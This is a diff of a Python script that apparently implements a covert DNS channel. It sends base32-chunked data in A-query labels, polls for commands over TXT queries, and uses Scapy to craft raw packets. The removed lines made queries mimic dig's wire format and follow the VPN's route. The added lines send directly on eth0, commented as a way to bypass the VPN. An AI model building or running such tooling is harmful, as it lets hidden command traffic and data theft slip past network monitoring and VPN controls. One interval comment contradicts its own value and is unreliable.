@@ -18,10 +18,8 @@ Command query format:
 """
 
 import base64
-import os
 import platform
 import re
-import struct
 import subprocess
 import threading
 import time
@@ -37,20 +35,11 @@ from scapy.layers.dns import DNS, DNSQR, DNSRR
 
 def _get_system_dns() -> str:
     """
-    Return the best available DNS server, preferring a VPN-adapter resolver
-    when OpenVPN is active (so queries reach the tunnel instead of being
-    dropped by the VPN's DNS filter).
-
-    Strategy (Windows):
-      1. Parse `netsh interface ip show dns` to collect every (adapter, ip) pair.
-      2. Prefer any adapter whose name matches common VPN adapter patterns.
-      3. Fall back to the first candidate overall, then 8.8.8.8.
-
-    Strategy (Linux/macOS):
-      Read /etc/resolv.conf; the VPN pushes its resolver to the top.
+    Return the device's first configured DNS server.
+    Falls back to 8.8.8.8 if nothing can be determined.
     """
     system = platform.system()
-    candidates = []      # [(adapter_name, ip), ...]
+    candidates = []
 
     if system == "Windows":
         try:
@@ -60,48 +49,27 @@ def _get_system_dns() -> str:
                 text=True,
                 timeout=5,
             )
-            current_adapter = ""
+            # Each valid IPv4 on a DNS-related line counts as a candidate.
             for line in out.splitlines():
-                # "Configuration for interface "OpenVPN TAP-Windows6""
-                m_iface = re.match(r'Configuration for interface "(.+)"', line.strip())
-                if m_iface:
-                    current_adapter = m_iface.group(1)
-                m_ip = re.search(r"(\d{1,3}(?:\.\d{1,3}){3})", line)
-                if m_ip and re.search(r"DNS|Statically|DHCP", line, re.IGNORECASE):
-                    candidates.append((current_adapter, m_ip.group(1)))
+                if re.search(r"DNS", line, re.IGNORECASE):
+                    m = re.search(r"(\d{1,3}(?:\.\d{1,3}){3})", line)
+                    if m:
+                        candidates.append(m.group(1))
         except Exception:
             pass
-
-        # Prefer VPN adapters (TAP, tun, OpenVPN, WireGuard, etc.)
-        vpn_patterns = re.compile(r"tap|tun|openvpn|wireguard|vpn", re.IGNORECASE)
-        for adapter, ip in candidates:
-            if vpn_patterns.search(adapter):
-                return ip
-
-        return candidates[0][1] if candidates else "8.8.8.8"
-
     else:
-        # Linux / macOS — VPN pushes its nameserver to the top of resolv.conf
+        # Linux / macOS
         try:
             with open("/etc/resolv.conf") as fh:
                 for line in fh:
                     if line.startswith("nameserver"):
                         parts = line.split()
                         if len(parts) >= 2:
-                            return parts[1]
+                            candidates.append(parts[1])
         except Exception:
             pass
-        return "8.8.8.8"
 
-
-def _outbound_iface(dst_ip: str) -> str:
-    """
-    Return the Scapy interface name that the OS would use to reach dst_ip.
-    conf.route.route() mirrors the kernel routing table, so it picks correctly
-    even when VPN adapters, virtual NICs, or multiple physical NICs are present.
-    """
-    iface, _, _ = conf.route.route(dst_ip)
-    return iface
+    return candidates[0] if candidates else "8.8.8.8"
 
 
 # ---------------------------------------------------------------------------
@@ -112,8 +80,10 @@ DNS_SERVER      = ""                    # set in __main__ to the system resolver
 COMMAND_INTERVAL = 10                  # seconds between command polls (10 min)
 CHUNK_SIZE      = 50                    # base32 chars per DNS label (≈31 raw bytes)
 QUERY_DELAY     = 0.5                   # seconds between consecutive chunk queries
+IFACE           = "eth0"               # bypass VPN by sending directly on eth0
 
-conf.verb = 0  # suppress Scapy output
+conf.verb = 0
+conf.iface = IFACE
 
 
 # ---------------------------------------------------------------------------
@@ -140,41 +110,22 @@ def _gen_session() -> str:
 # DNS helpers
 # ---------------------------------------------------------------------------
 
-def _edns0_opt() -> DNSRR:
-    """EDNS0 OPT pseudo-RR matching dig's wire format (udp=1232, COOKIE option)."""
-    cookie_opt = struct.pack("!HH", 10, 8) + os.urandom(8)
-    return DNSRR(rrname=b"\x00", type=41, rclass=1232, ttl=0, rdata=cookie_opt)
-
-
-def _dns_flags() -> dict:
-    """Common DNS query flags: RD + AD, random non-zero ID."""
-    return dict(id=random.randint(1, 65535), rd=1, ad=1)
-
-
 def _query_a(qname: str) -> None:
-    """Fire-and-forget DNS A query with EDNS0, matching dig's wire format."""
-    iface = _outbound_iface(DNS_SERVER)
-    opt = _edns0_opt()
+    """Fire-and-forget DNS A query (no wait for response)."""
     pkt = IP(dst=DNS_SERVER) / UDP(sport=random.randint(1024, 65534), dport=53) / DNS(
-        **_dns_flags(),
+        rd=1,
         qd=DNSQR(qname=qname, qtype="A"),
-        ar=opt,
-        arcount=1,
     )
-    send(pkt, iface=iface, verbose=0)
+    send(pkt, verbose=0)
 
 
 def _query_txt(qname: str):
-    """DNS TXT query with EDNS0 on the correct outbound interface, waits for reply."""
-    iface = _outbound_iface(DNS_SERVER)
-    opt = _edns0_opt()
+    """Send a DNS TXT query and return the response packet."""
     pkt = IP(dst=DNS_SERVER) / UDP(sport=random.randint(1024, 65534), dport=53) / DNS(
-        **_dns_flags(),
+        rd=1,
         qd=DNSQR(qname=qname, qtype="TXT"),
-        ar=opt,
-        arcount=1,
     )
-    return sr1(pkt, iface=iface, timeout=5, verbose=0)
+    return sr1(pkt, timeout=5, verbose=0)
 
 
 def _extract_txt(resp) -> str | None:
